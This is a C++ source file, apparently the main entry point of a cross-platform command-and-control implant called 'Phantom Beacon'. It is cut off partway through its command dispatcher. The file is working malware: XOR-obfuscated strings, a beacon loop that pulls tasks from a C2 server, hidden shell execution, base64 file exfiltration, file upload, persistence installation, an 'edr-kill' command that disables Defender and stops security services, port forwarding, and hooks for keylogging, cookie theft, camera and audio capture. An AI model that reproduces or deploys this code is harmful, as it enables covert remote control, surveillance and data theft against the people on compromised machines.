// ============================================================================
//  main.cpp — Phantom Beacon Entry Point (Cross-Platform)
//  ──────────────────────────────────────────────────────────
//  Beacon loop: check-in → receive tasks → execute → send results → sleep.
//
//  Build (Windows - MinGW-w64):
//    x86_64-w64-mingw32-g++ -std=c++20 -O2 -s -o beacon.exe main.cpp syscalls.o
//        -lwinhttp -lbcrypt -lws2_32 -lbthprops -lwlanapi -liphlpapi -lcrypt32 -static
//
//  Build (Windows - MSVC):
//    cl /EHsc /O2 /std:c++20 main.cpp syscalls.o /link winhttp.lib bcrypt.lib ws2_32.lib bthprops.lib wlanapi.lib iphlpapi.lib
//
//  Build (Linux / macOS):
//    g++ -std=c++17 -O2 -s -o beacon main.cpp -lcurl -lssl -lcrypto -lpthread
// ============================================================================

#ifdef _WIN32
    #ifndef WIN32_LEAN_AND_MEAN
    #define WIN32_LEAN_AND_MEAN
    #endif
    #ifndef _WIN32_WINNT
    #define _WIN32_WINNT 0x0601
    #endif
    #include <windows.h>
    extern "C" BOOL clear_hw_breakpoints();
    extern "C" void flush_cpu_telemetry();
#else
    #include <unistd.h>
    #include <sys/utsname.h>
    #include <sys/types.h>
    #include <sys/wait.h>
    #include <sys/select.h>
    #include <signal.h>
    #include <errno.h>
    #include <fstream>
    #include <chrono>
    #include <thread>
    #include <cstring>
    #define Sleep(ms) std::this_thread::sleep_for(std::chrono::milliseconds(ms))
#endif
#include <cstdlib>
#include <cstdio>
#include <ctime>
#include <string>
#include <vector>
#include <sstream>
#include <fstream>
#include <algorithm>
#include <functional>
#include <utility>
#include <thread>
#include <atomic>
#include <memory>
#include <mutex>

#include "build_id.h"
#include "c2_config.h"
#include "config_encrypted.h"
#include "evasion.h"
#include "crypto.h"
#include "network.h"
#include "recon.h"
#include "portfwd.h"
#include "keylogger.h"
#include "persistence.h"
#include "task_lifecycle.h"

#include "screenshot.h"
#include "media_utils.h"
#include "gps.h"
#include "camera.h"
#include "audio.h"
#include "screen_record.h"
#include "injection.h"
#include "proxy.h"
#include "browser_pivot.h"
#include "netstat.h"
#include "cookie_stealer.h"
#include "cdp_pivot.h"
// sleep_mask.h and peb_unlink.h are self-guarded and now carry POSIX
// implementations too (masked sleep / link_map unlink), so include them on
// every platform.
#include "sleep_mask.h"
#include "peb_unlink.h"
#ifdef _WIN32
#include "sleep_ekko.h"
#include "smb.h"
#include "apc_injection.h"
#endif
#include "wlan_scan.h"
#include "bt_scan.h"
#include "inmemory.h"
#include "secure_heap.h"

// ── Minimal JSON Parser ────────────────────────────────────────────────────
// We avoid pulling in nlohmann/json to keep the binary tiny.
// This is a purpose-built parser for our specific C2 protocol.

namespace json_mini {

inline std::string get_string(const std::string& json, const std::string& key) {
    std::string key_q = XOR_DEC(XOR_STR("\"")).c_str() + key + XOR_DEC(XOR_STR("\"")).c_str();
    size_t key_pos = json.find(key_q);
    if (key_pos == std::string::npos) return "";

    size_t colon_pos = json.find(':', key_pos + key_q.length());
    if (colon_pos == std::string::npos) return "";

    size_t start_quote = json.find('"', colon_pos);
    if (start_quote == std::string::npos) return "";
    start_quote++;

    // Scan for the closing quote, skipping escaped \" so values may contain
    // quotes (e.g. shell commands with embedded quotes).
    size_t end_quote = std::string::npos;
    bool escaped = false;
    for (size_t i = start_quote; i < json.size(); ++i) {
        if (escaped) { escaped = false; continue; }
        if (json[i] == '\\') { escaped = true; continue; }
        if (json[i] == '"') { end_quote = i; break; }
    }
    if (end_quote == std::string::npos) return "";

    std::string val = json.substr(start_quote, end_quote - start_quote);
    std::string result;
    for (size_t i = 0; i < val.size(); ++i) {
        if (val[i] == '\\' && i + 1 < val.size()) {
            switch (val[i+1]) {
                case 'n':  result += '\n'; break;
                case 'r':  result += '\r'; break;
                case 't':  result += '\t'; break;
                case '\\': result += '\\'; break;
                case '"':  result += '"';  break;
                default:   result += val[i+1]; break;
            }
            i++;
        } else {
            result += val[i];
        }
    }
    return result;
}

// Extract the "tasks" array from C2 response: [{"task_id":"...","command":"..."},...]
struct Task {
    std::string task_id;
    std::string command;
};

inline std::vector<Task> parse_tasks(const std::string& json) {
    std::vector<Task> tasks;
    // Find the "tasks" key
    size_t key_pos = json.find(XOR_DEC(XOR_STR("\"tasks\"")).c_str());
    if (key_pos == std::string::npos) return tasks;
    
    // Find the start of the array [
    size_t arr_start = json.find('[', key_pos);
    if (arr_start == std::string::npos) return tasks;

    // Find each { ... } object in the array, honoring strings: a } inside a
    // quoted command must not terminate the object.
    size_t pos = arr_start;
    while (true) {
        size_t obj_start = json.find('{', pos);
        if (obj_start == std::string::npos) break;
        size_t obj_end = std::string::npos;
        bool in_str = false, esc = false;
        for (size_t i = obj_start + 1; i < json.size(); ++i) {
            if (in_str) {
                if (esc) { esc = false; }
                else if (json[i] == '\\') { esc = true; }
                else if (json[i] == '"') { in_str = false; }
            } else if (json[i] == '"') {
                in_str = true;
            } else if (json[i] == '}') {
                obj_end = i;
                break;
            }
        }
        if (obj_end == std::string::npos) break;

        std::string obj = json.substr(obj_start, obj_end - obj_start + 1);
        Task t;
        t.task_id = get_string(obj, XOR_DEC(XOR_STR("task_id")).c_str());
        t.command = get_string(obj, XOR_DEC(XOR_STR("command")).c_str());
        if (!t.task_id.empty()) tasks.push_back(t);

        pos = obj_end + 1;
    }
    return tasks;
}

}  // namespace json_mini

// ── Shell Execution ────────────────────────────────────────────────────────

// Thread wrapper for asynchronous tasks
#ifdef _WIN32
DWORD WINAPI AsyncThreadWrapper(LPVOID lpParam) {
    auto* func = static_cast<std::function<void()>*>(lpParam);
    (*func)();
    delete func;
    return 0;
}
#endif

// Default budget: most commands (whoami, ls, sysinfo, wlan-scan, ...) finish
// in a second. Media captures take longer and carry their own duration, so
// the caller can raise the budget per-command.
static const int DEFAULT_TASK_TIMEOUT_MS = 30000;

// Hard ceiling on captured output for one command. A flooding command (a
// recursive cat, a verbose installer) is truncated AND killed: an unbounded
// read is how a beacon OOMs on an engagement it can no longer report.
static const size_t kMaxTaskOutput = 512 * 1024;

// run_shell_command() must never outlive its budget, and when it does it must
// take the whole process TREE with it — not just the shell it spawned. A
// `cmd.exe /c start foo.exe` that survives the timeout keeps running on the
// target with no watchdog, no output channel and no way to stop it.
//
// Windows: every child is assigned to a Job Object created with
// KILL_ON_JOB_CLOSE, so closing the handle kills the tree even if this frame
// is torn down unexpectedly. The child is created SUSPENDED, assigned, then
// resumed — otherwise it can spawn a grandchild before the assignment and
// escape the job.
//
// POSIX: the child becomes a process-group leader (setpgid on both sides to
// close the race) and the timeout kills the group with kill(-pgid, SIGKILL).
static std::string run_shell_command_bounded(const std::string& cmd,
                                             int budget_ms) {
    std::string output;
    bool overflow = false;
    bool timed_out = false;

#ifdef _WIN32
    HANDLE hRead, hWrite;
    SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), nullptr, TRUE };
    if (!CreatePipe(&hRead, &hWrite, &sa, 0)) return XOR_DEC(XOR_STR("Error: pipe creation failed")).c_str();
    SetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0);

    // The job IS the process-tree guarantee. If it cannot be created we still
    // run the command, but the timeout below then only kills the direct child.
    HANDLE job = CreateJobObjectA(nullptr, nullptr);
    if (job) {
        JOBOBJECT_EXTENDED_LIMIT_INFORMATION limits;
        ZeroMemory(&limits, sizeof(limits));
        limits.BasicLimitInformation.LimitFlags = JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE;
        if (!SetInformationJobObject(job, JobObjectExtendedLimitInformation,
                                     &limits, sizeof(limits))) {
            CloseHandle(job);
            job = nullptr;
        }
    }

    STARTUPINFOA si = { sizeof(STARTUPINFOA) };
    si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
    si.wShowWindow = SW_HIDE;
    si.hStdOutput = hWrite;
    si.hStdError = hWrite;

    PROCESS_INFORMATION pi = { 0 };
    // Use cmd.exe /c to support built-ins and pipes.
    // CreateProcessA may modify the command-line buffer in place — it MUST
    // be a writable copy, never .c_str() of a const std::string.
    std::string full_cmd = XOR_DEC(XOR_STR("cmd.exe /c ")).c_str() + cmd;
    std::vector<char> cmd_buf(full_cmd.begin(), full_cmd.end());
    cmd_buf.push_back('\0');

    // CREATE_SUSPENDED so the job assignment lands before any child can run.
    DWORD flags = CREATE_NO_WINDOW | CREATE_NEW_PROCESS_GROUP | CREATE_SUSPENDED;

    if (CreateProcessA(nullptr, cmd_buf.data(), nullptr, nullptr, TRUE, flags,
                       nullptr, nullptr, &si, &pi)) {
        CloseHandle(hWrite);
        bool in_job = false;
        if (job) in_job = AssignProcessToJobObject(job, pi.hProcess) != FALSE;
        ResumeThread(pi.hThread);

        const DWORD deadline = GetTickCount() + static_cast<DWORD>(budget_ms);
        for (;;) {
            DWORD avail = 0;
            // PeekNamedPipe does not block, so "no data yet" and "pipe closed"
            // stay distinguishable — which ReadFile alone cannot express.
            if (!PeekNamedPipe(hRead, nullptr, 0, nullptr, &avail, nullptr)) break;
            if (avail > 0) {
                char buffer[4096];
                DWORD want = avail < sizeof(buffer) - 1
                                 ? avail
                                 : static_cast<DWORD>(sizeof(buffer) - 1);
                DWORD got = 0;
                if (!ReadFile(hRead, buffer, want, &got, nullptr) || got == 0) break;
                buffer[got] = '\0';
                output += buffer;
                if (output.size() > kMaxTaskOutput) { overflow = true; break; }
                continue;
            }
            if (WaitForSingleObject(pi.hProcess, 0) == WAIT_OBJECT_0) break;
            if (GetTickCount() > deadline) { timed_out = true; break; }
            Sleep(25);
        }

        if (timed_out || overflow) {
            // The whole tree when we can prove we own it, the direct child
            // otherwise. Silence about which one happened is how an operator
            // ends up with a mystery process they cannot account for.
            if (in_job) TerminateJobObject(job, 1);
            else TerminateProcess(pi.hProcess, 1);
        }
        // Bounded: after a kill the kernel needs a moment, but an unbounded
        // wait here would re-introduce the very wedge this fixes.
        WaitForSingleObject(pi.hProcess, 2000);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
    } else {
        output = XOR_DEC(XOR_STR("Error: CreateProcess failed")).c_str();
        CloseHandle(hWrite);
    }
    CloseHandle(hRead);
    // KILL_ON_JOB_CLOSE mops up any grandchild that outlived its parent.
    if (job) CloseHandle(job);

#else
    int pipe_fd[2];
    if (pipe(pipe_fd) == -1) return XOR_DEC(XOR_STR("Error: pipe failed")).c_str();

    pid_t pid = fork();
    if (pid == 0) { // Child
        close(pipe_fd[0]);
        // Become a group leader so the parent can signal the whole tree.
        setpgid(0, 0);
        dup2(pipe_fd[1], STDOUT_FILENO);
        dup2(pipe_fd[1], STDERR_FILENO);
        close(pipe_fd[1]);
        execl(XOR_DEC(XOR_STR("/bin/sh")).c_str(), XOR_DEC(XOR_STR("sh")).c_str(), XOR_DEC(XOR_STR("-c")).c_str(), cmd.c_str(), (char*)NULL);
        _exit(1);
    } else if (pid > 0) { // Parent
        // Same call on both sides: whichever wins, the group exists before the
        // child can spawn and escape it.
        setpgid(pid, pid);
        close(pipe_fd[1]);

        const auto deadline = std::chrono::steady_clock::now() +
                              std::chrono::milliseconds(budget_ms);
        bool reaped = false;
        for (;;) {
            fd_set rfds;
            FD_ZERO(&rfds);
            FD_SET(pipe_fd[0], &rfds);
            // 100ms slices: short enough to notice the deadline promptly,
            // long enough not to spin.
            struct timeval tv;
            tv.tv_sec = 0;
            tv.tv_usec = 100000;
            int ready = select(pipe_fd[0] + 1, &rfds, nullptr, nullptr, &tv);

            if (ready > 0) {
                char buffer[4096];
                ssize_t n = read(pipe_fd[0], buffer, sizeof(buffer) - 1);
                if (n > 0) {
                    buffer[n] = '\0';
                    output += buffer;
                    if (output.size() > kMaxTaskOutput) { overflow = true; break; }
                } else {
                    break;  // EOF: child closed stdout, it is on its way out
                }
            } else if (ready == 0) {
                // No data. Did the child exit, and are we out of time?
                int status = 0;
                pid_t done = waitpid(pid, &status, WNOHANG);
                if (done == pid) { reaped = true; break; }
                if (std::chrono::steady_clock::now() > deadline) { timed_out = true; break; }
            } else {
                break;  // select() error (EINTR among them): stop reading
            }
        }
        close(pipe_fd[0]);

        if (timed_out || overflow) kill(-pid, SIGKILL);   // the whole group
        if (!reaped) {
            // Bounded reap, then SIGKILL: a zombie keeps its pid (and the
            // output pipe) alive forever, which is a leak, not a timeout.
            for (int i = 0; i < 20; ++i) {
                int status = 0;
                pid_t done = waitpid(pid, &status, WNOHANG);
                if (done == pid || (done < 0 && errno != EINTR)) { reaped = true; break; }
                usleep(100 * 1000);   // up to ~2s
            }
            if (!reaped) {
                kill(-pid, SIGKILL);
                int status = 0;
                waitpid(pid, &status, 0);
            }
        }
    } else {
        close(pipe_fd[0]);
        close(pipe_fd[1]);
        return XOR_DEC(XOR_STR("Error: fork failed")).c_str();
    }
#endif

    if (output.empty()) output = XOR_DEC(XOR_STR("(no output)\n")).c_str();
    return output;
}

std::string run_shell_command(const std::string& cmd) {
    if (cmd.empty()) return XOR_DEC(XOR_STR("Error: empty command")).c_str();
    return run_shell_command_bounded(cmd, DEFAULT_TASK_TIMEOUT_MS);
}
// ── Task Watchdog ──────────────────────────────────────────────────────────
// A blocking task (camera Media Foundation ReadSample, a long media
// capture, a hung shell pipe) must NEVER wedge the whole beacon loop:
// while a task is stuck the beacon stops checking in, the C2 shows the
// task as "sent" forever, and every later task (gps, screenshot, ...)
// queues up behind it. So each task runs on a worker thread under a bounded
// wait, and on timeout the beacon reports the task dead and moves on.
//
// The bug this used to have: the run's state lived in a `TaskRun` on THIS
// frame, the worker got a raw pointer to it, and the timeout path called
// detach() and returned. The worker woke up later and wrote
// `tr->output = ...; tr->done = true` into a stack frame that no longer
// existed — a use-after-free that corrupted the beacon's own stack and could
// kill the implant mid-engagement. It also had no way to stop the command:
// the timeout ended the beacon's WAIT, not the command.
//
// Now the run is a shared_ptr (task::Run) that the watchdog, the worker, and
// the registry all reference, so the storage outlives every one of them. A
// worker that finishes after a cancellation finds a live object, sees the
// cancel flag, and drops its result instead of publishing output for a task
// the C2 has already been told is dead. See task_lifecycle.h.

std::string dispatch_command(const std::string& cmd, net::C2Config& cfg);

static std::string run_task_with_timeout(
        const std::string& cmd,
        const std::shared_ptr<net::C2Config>& cfg_owner,
        int timeout_ms = DEFAULT_TASK_TIMEOUT_MS) {
    // The cap is checked BEFORE the thread exists. It exists to stop
    // SPAWNING stranded workers, and the old check ran after the spawn, so it
    // could never prevent one. A refusal is a DECISION, not a wait.
    if (task::Registry::instance().live() >= static_cast<size_t>(task::kMaxDetached)) {
        return "[TASK_REFUSED] '" + cmd.substr(0, 48) + "' not started: " +
               std::to_string(task::kMaxDetached) +
               " tasks already stuck (beacon state degraded)\n";
    }

    // Capture BY VALUE for `cmd`, and hand the config over as the shared_ptr
    // it now is. `cmd` is `task.command` -> an element of the caller's
    // block-scoped vector, rebuilt on every poll: a detached worker that
    // outlived that block used to read a freed std::string. The shared_ptr
    // keeps the config alive for as long as the worker may run.
    auto run = std::make_shared<task::Run>(
        [cmd, cfg_owner]() { return dispatch_command(cmd, *cfg_owner); });
    run->mark_running();

    std::thread worker([run]() {
        const std::string out = run->work()();
        // publish() is a no-op when the watchdog already gave up, which is
        // the whole point: no write to a dead object, no late result.
        run->publish(out);
        // Tell the registry the THREAD is gone, THEN drop our reference: the
        // registry must not treat this run as reapable while we are still
        // inside it (that is what made the stranded-worker cap unreachable).
        run->mark_worker_exited();
        task::Registry::instance().release(run.get());
    });

    // Bounded wait in small slices: a task that finishes early is noticed
    // quickly, and shutdown/Ctrl+C still lands promptly.
    int waited = 0;
    const int STEP = 50;
    while (!run->finished() && waited < timeout_ms) {
        Sleep(STEP);
        waited += STEP;
    }

    if (run->finished()) {
        worker.join();   // the worker is done, so this returns at once
        return run->output();
    }

    // Timed out. The worker is blocked somewhere we cannot reach (camera
    // driver, a pipe that never closes). Cancel it, register it as stranded,
    // and DETACH so the beacon keeps polling.
    //
    // NEVER join() here. join() waits for the THREAD, and the thread is
    // blocked by definition -- that is the only way to reach this branch --
    // so joining would wedge the beacon for ever, with no error and no
    // result: the operator sees a live implant that answers nothing. The
    // worker owns its own shared_ptr to `run`, so the storage stays valid
    // whether or not admit() registered it, and its release() is how the
    // registry learns the thread finally exited.
    run->request_cancel(task::State::kTimedOut);
    task::Registry::instance().admit(run);
    worker.detach();

    const char* name = task::state_name(task::State::kTimedOut);
    std::string head = cmd.substr(0, 48);
    return std::string("[") + name + "] '" + head + "' exceeded " +
           std::to_string(timeout_ms / 1000) +
           "s — process tree killed, beacon continues\n";
}
// ── Command Dispatcher ─────────────────────────────────────────────────────

// Health counters (written by the main loop, read by the `health` command)
static unsigned long g_checkins_ok = 0, g_checkins_fail = 0, g_tasks_done = 0;
static unsigned long long g_uptime_start = 0;
static std::string g_last_error;

std::string dispatch_command(const std::string& cmd, net::C2Config& cfg) {
    // Parse command and arguments
    std::istringstream iss(cmd);
    std::string action;
    iss >> action;

    if (action == XOR_DEC(XOR_STR("edrcheck")).c_str()) {
#ifdef _WIN32
        // EDR situational awareness: userland hooks, known EDR drivers.
        // Read-only — run this FIRST on a new foothold.
        edrcheck::EdrReport rep;
        edrcheck::report(rep);
        std::ostringstream o;
        o << "ntdll_hooks=" << (rep.ntdll_hooked ? "YES" : "no")
          << " (" << rep.hooked_stubs << " stubs)\n"
          << "known_edr_drivers=" << rep.known_edr << "\n";
        if (rep.known_edr > 0) o << rep.drivers;
        o << "etw_ti=" << (rep.etw_ti_alive ? "assumed-alive" : "no") << "\n";
        return o.str();
#else
        // POSIX: same situational awareness as Windows (LSM / eBPF / audit /
        // known agents on Linux; SIP / system extensions on macOS).
        edrcheck::EdrReport rep;
        edrcheck::report(rep);
        return edrcheck::format(rep);
#endif
    }
    if (action == XOR_DEC(XOR_STR("edr-kill")).c_str()) {
        // Burn the defensive stack: disable Defender realtime + stop known
        // AV/EDR services (Windows) / daemons (Linux). Destructive — only
        // ever issued after `edrcheck` shows what is present. Needs SYSTEM
        // on Windows for the service stops to stick.
        return edrkill::kill_av();
    }
    if (action == XOR_DEC(XOR_STR("health")).c_str()) {
        // Beacon health self-report: cadence, uptime, counters, last error.
        unsigned long long now = (unsigned long long)time(nullptr);
        unsigned long long up = g_uptime_start ? (now - g_uptime_start) : 0;
        std::ostringstream o;
        o << "uptime_s=" << up
          << " checkins_ok=" << g_checkins_ok
          << " checkins_fail=" << g_checkins_fail
          << " tasks_done=" << g_tasks_done
          << " sleep_ms=" << cfg.sleep_ms
          << " jitter=" << cfg.jitter << "%"
          << " build=" << BUILD_ID;
        if (!g_last_error.empty()) o << " last_error=\"" << g_last_error << "\"";
        return o.str();
    }
    else if (action == XOR_DEC(XOR_STR("set-sleep")).c_str()) {
        // C2-driven cadence rotation mid-session (no beacon restart):
        // set-sleep <ms> [jitter%]
        int ms = -1, jit = -1;
        if (iss >> ms) { if (!(iss >> jit)) jit = cfg.jitter; }
        if (ms <= 0) return "Usage: set-sleep <ms> [jitter%]";
        if (jit < 0) jit = 0;
        if (jit > 100) jit = 100;
        cfg.sleep_ms = ms;
        cfg.base_sleep_ms = ms;
        cfg.jitter = jit;
        g_last_error = "";   // cadence rotation implies a healthy operator link
        return "Cadence set: " + std::to_string(ms) + "ms (jitter " +
               std::to_string(jit) + "%)";
    }
    else if (action == XOR_DEC(XOR_STR("recon")).c_str()) {
        std::string path;
        std::getline(iss >> std::ws, path);
        return recon::format_human(path);
    }
    else if (action == XOR_DEC(XOR_STR("ls")).c_str() || action == XOR_DEC(XOR_STR("dir")).c_str()) {
        std::string path;
        std::getline(iss >> std::ws, path);
        if (path.empty()) path = ".";
        auto entries = recon::list_directory(path);
        std::string out;
        for (auto& e : entries) {
            out += (e.isDir ? XOR_DEC(XOR_STR("[DIR]  ")).c_str() : XOR_DEC(XOR_STR("[FILE] ")).c_str());
            out += e.name;
            if (!e.isDir) { out += XOR_DEC(XOR_STR("  (")).c_str(); out += recon::i2s(e.size); out += XOR_DEC(XOR_STR(" bytes)")).c_str(); }
            out += XOR_DEC(XOR_STR("\n")).c_str();
        }
        return out;
    }
    else if (action == XOR_DEC(XOR_STR("drives")).c_str()) {
        auto drives = recon::enumerate_drives();
        std::string out;
        for (auto& d : drives) {
            int totalGB = static_cast<int>(d.totalBytes / (1073741824.0));
            int freeGB  = static_cast<int>(d.freeBytes  / (1073741824.0));
            out += d.letter + XOR_DEC(XOR_STR("  [")).c_str() + d.type + XOR_DEC(XOR_STR("]")).c_str()
                + XOR_DEC(XOR_STR("  Total: ")).c_str() + recon::i2s(totalGB) + XOR_DEC(XOR_STR(" GB")).c_str()
                + XOR_DEC(XOR_STR("  Free: ")).c_str() + recon::i2s(freeGB) + XOR_DEC(XOR_STR(" GB\n")).c_str();
        }
        return out;
    }
    else if (action == XOR_DEC(XOR_STR("whoami")).c_str()) {
#ifdef _WIN32
        char user[256] = {0}, computer[256] = {0};
        DWORD usize = sizeof(user), csize = sizeof(computer);
        if (!GetUserNameA(user, &usize)) strncpy(user, "unknown", sizeof(user) - 1);
        if (!GetComputerNameA(computer, &csize)) strncpy(computer, "unknown", sizeof(computer) - 1);
        return std::string(XOR_DEC(XOR_STR("User: ")).c_str()) + user + XOR_DEC(XOR_STR("\nComputer: ")).c_str() + computer + XOR_DEC(XOR_STR("\n")).c_str();
#else
        char hostname[256] = {0};
        gethostname(hostname, sizeof(hostname));
        const char* user = getenv("USER");
        if (!user) user = XOR_DEC(XOR_STR("unknown")).c_str();
        return std::string(XOR_DEC(XOR_STR("User: ")).c_str()) + user + XOR_DEC(XOR_STR("\nHostname: ")).c_str() + hostname + XOR_DEC(XOR_STR("\n")).c_str();
#endif
    }
    else if (action == XOR_DEC(XOR_STR("portfwd")).c_str()) {
        int localPort, remotePort;
        std::string remoteHost;
        if (iss >> localPort >> remoteHost >> remotePort) {
            return portfwd::start_forward(localPort, remoteHost, remotePort);
        }
        return XOR_DEC(XOR_STR("Usage: portfwd <local_port> <remote_host> <remote_port>")).c_str();
    }
    else if (action == XOR_DEC(XOR_STR("portfwd-stop")).c_str()) {
        return portfwd::stop_all_forwards();
    }
    else if (action == XOR_DEC(XOR_STR("download")).c_str()) {
        std::string filepath;
        std::getline(iss >> std::ws, filepath);
        if (filepath.empty()) return XOR_DEC(XOR_STR("Usage: download <filepath>")).c_str();

#ifdef _WIN32
        HANDLE hFile = CreateFileA(filepath.c_str(), GENERIC_READ, FILE_SHARE_READ,
            nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
        if (hFile == INVALID_HANDLE_VALUE)
            return XOR_DEC(XOR_STR("Error: Cannot open file ")).c_str() + filepath;

        DWORD fileSize = GetFileSize(hFile, nullptr);
        if (fileSize == INVALID_FILE_SIZE || fileSize > 10 * 1024 * 1024) {
            CloseHandle(hFile);
            return XOR_DEC(XOR_STR("Error: File too large or invalid")).c_str();
        }

        std::vector<BYTE> buffer(fileSize);
        DWORD bytesRead;
        ReadFile(hFile, buffer.data(), fileSize, &bytesRead, nullptr);
        CloseHandle(hFile);

        buffer.resize(bytesRead);
        return XOR_DEC(XOR_STR("FILE_B64:")).c_str() + crypto::base64_encode(buffer);
#else
        std::ifstream file(filepath, std::ios::binary);
        if (!file) return XOR_DEC(XOR_STR("Error: Cannot open file ")).c_str() + filepath;

        file.seekg(0, std::ios::end);
        size_t fileSize = file.tellg();
        if (fileSize > 10 * 1024 * 1024) return XOR_DEC(XOR_STR("Error: File too large")).c_str();
        file.seekg(0, std::ios::beg);

        std::vector<BYTE> buffer(fileSize);
        file.read(reinterpret_cast<char*>(buffer.data()), fileSize);
        buffer.resize(file.gcount());
        return XOR_DEC(XOR_STR("FILE_B64:")).c_str() + crypto::base64_encode(buffer);
#endif
    }
    else if (action == XOR_DEC(XOR_STR("upload")).c_str()) {
        std::string filepath, b64data;
        iss >> filepath >> b64data;
        if (filepath.empty() || b64data.empty())
            return XOR_DEC(XOR_STR("Usage: upload <filepath> <base64_data>")).c_str();

        auto data = crypto::base64_decode(b64data);
#ifdef _WIN32
        HANDLE hFile = CreateFileA(filepath.c_str(), GENERIC_WRITE, 0,
            nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
        if (hFile == INVALID_HANDLE_VALUE)
            return XOR_DEC(XOR_STR("Error: Cannot create file ")).c_str() + filepath;

        DWORD bytesWritten;
        WriteFile(hFile, data.data(), static_cast<DWORD>(data.size()), &bytesWritten, nullptr);
        CloseHandle(hFile);
        return XOR_DEC(XOR_STR("Uploaded ")).c_str() + recon::i2s(bytesWritten) + XOR_DEC(XOR_STR(" bytes to ")).c_str() + filepath;
#else
        std::ofstream file(filepath, std::ios::binary);
        if (!file) return XOR_DEC(XOR_STR("Error: Cannot create file ")).c_str() + filepath;

        file.write(reinterpret_cast<const char*>(data.data()), data.size());
        return XOR_DEC(XOR_STR("Uploaded ")).c_str() + recon::i2s(data.size()) + XOR_DEC(XOR_STR(" bytes to ")).c_str() + filepath;
#endif
    }
    else if (action == XOR_DEC(XOR_STR("sysinfo")).c_str()) {
        return recon::get_sysinfo();
    }
    else if (action == XOR_DEC(XOR_STR("netinfo")).c_str()) {
        return recon::get_netinfo();
    }
    else if (action == XOR_DEC(XOR_STR("processes")).c_str()) {
        return recon::get_processes();
    }
    else if (action == XOR_DEC(XOR_STR("find")).c_str()) {
        std::string root, pattern;
        iss >> root >> pattern;
        if (root.empty() || pattern.empty()) return XOR_DEC(XOR_STR("Usage: find <root> <pattern>")).c_str();
        return recon::find_files(root, pattern);
    }
    else if (action == XOR_DEC(XOR_STR("pwd")).c_str()) {
#ifdef _WIN32
        char buf[MAX_PATH];
        GetCurrentDirectoryA(MAX_PATH, buf);
        return std::string(buf) + XOR_DEC(XOR_STR("\n")).c_str();
#else
        char buf[1024];
        if (getcwd(buf, sizeof(buf))) return std::string(buf) + XOR_DEC(XOR_STR("\n")).c_str();
        return XOR_DEC(XOR_STR("Error getting current directory\n")).c_str();
#endif
    }
    else if (action == XOR_DEC(XOR_STR("cd")).c_str() || action == XOR_DEC(XOR_STR("cd..")).c_str()) {
        std::string path;
        if (action == XOR_DEC(XOR_STR("cd..")).c_str()) path = "..";
        else std::getline(iss >> std::ws, path);
        if (path.empty()) return XOR_DEC(XOR_STR("Usage: cd <path>")).c_str();
        
        // Strip quotes if present
        if (path.size() >= 2 && path.front() == '"' && path.back() == '"') {
            path = path.substr(1, path.size() - 2);
        }

#ifdef _WIN32
        if (SetCurrentDirectoryA(path.c_str())) return XOR_DEC(XOR_STR("Directory changed to ")).c_str() + path + XOR_DEC(XOR_STR("\n")).c_str();
#else
        if (chdir(path.c_str()) == 0) return XOR_DEC(XOR_STR("Directory changed to ")).c_str() + path + XOR_DEC(XOR_STR("\n")).c_str();
#endif
        return XOR_DEC(XOR_STR("Error changing directory\n")).c_str();
    }
    else if (action == XOR_DEC(XOR_STR("cat")).c_str()) {
        std::string path;
        std::getline(iss >> std::ws, path);
        if (path.empty()) return XOR_DEC(XOR_STR("Usage: cat <file>")).c_str();
        std::ifstream f(path, std::ios::binary);
        if (!f) return XOR_DEC(XOR_STR("Error: Cannot open file ")).c_str() + path;
        
        f.seekg(0, std::ios::end);
        size_t size = f.tellg();
        if (size > 1 * 1024 * 1024) return XOR_DEC(XOR_STR("Error: File too large to cat (max 1MB). Use download.")).c_str();
        f.seekg(0, std::ios::beg);
        
        std::string out;
        char buf[4096];
        while (f.read(buf, sizeof(buf))) out.append(buf, f.gcount());
        out.append(buf, f.gcount());
        return out;
    }
    else if (action == XOR_DEC(XOR_STR("persist")).c_str()) {
        std::string name;
        iss >> name;
        if (name.empty()) name = XOR_DEC(XOR_STR("PhantomBeacon")).c_str();
#ifdef _WIN32
        return persistence::establish_windows(cfg, name);
#else
        return persistence::establish_linux(name);
#endif
    }
    else if (action == XOR_DEC(XOR_STR("unpersist")).c_str()) {
        // Remove EXACTLY what `persist` installed (same RunKey value /
        // systemd unit / autostart file / cron line / on-disk copy). The
        // report tells the client to clean up; this is the supported path.
        std::string name;
        iss >> name;
        if (name.empty()) name = XOR_DEC(XOR_STR("PhantomBeacon")).c_str();
#ifdef _WIN32
        return persistence::remove_windows(name);
#else
        return persistence::remove_posix(name);
#endif
    }
    else if (action == XOR_DEC(XOR_STR("sleep")).c_str()) {
        // sleep <ms> [jitter%] — reconfigure the beacon cadence at runtime.
        int ms = -1;
        int jit = -1;
        if (iss >> ms) { if (!(iss >> jit)) jit = cfg.jitter; }
        if (ms <= 0) return XOR_DEC(XOR_STR("Usage: sleep <ms> [jitter%] (e.g. sleep 30000 10)")).c_str();
        if (jit < 0) jit = 0;
        if (jit > 100) jit = 100;
        cfg.sleep_ms = ms;
        cfg.base_sleep_ms = ms;
        cfg.jitter = jit;
        return XOR_DEC(XOR_STR("Sleep set to ")).c_str() + std::to_string(ms) +
               XOR_DEC(XOR_STR("ms (jitter ")).c_str() + std::to_string(jit) +
               XOR_DEC(XOR_STR("%)")).c_str();
    }
    else if (action == XOR_DEC(XOR_STR("auth-rotate")).c_str()) {
#if BEACON_AUTH_ENABLED
        std::string encoded_secret;
        iss >> encoded_secret;
        auto next_secret = crypto::base64_decode(encoded_secret);
        if (next_secret.size() != crypto::AUTH_SECRET_LEN) {
            return "AUTH_ROTATE_ERROR: expected a 32-byte base64 secret";
        }
        if (!crypto::save_auth_secret(next_secret.data(), next_secret.size())) {
            return "AUTH_ROTATE_ERROR: secure state storage failed";
        }
        std::copy(next_secret.begin(), next_secret.end(), cfg.auth_secret.begin());
        return "AUTH_ROTATED";
#else
        return "AUTH_ROTATE_ERROR: beacon authentication is not enabled";
#endif
    }
    else if (action == XOR_DEC(XOR_STR("keylog")).c_str()) {
        std::string subCmd;
        iss >> subCmd;
        if (subCmd == XOR_DEC(XOR_STR("start")).c_str()) return keylogger::start();
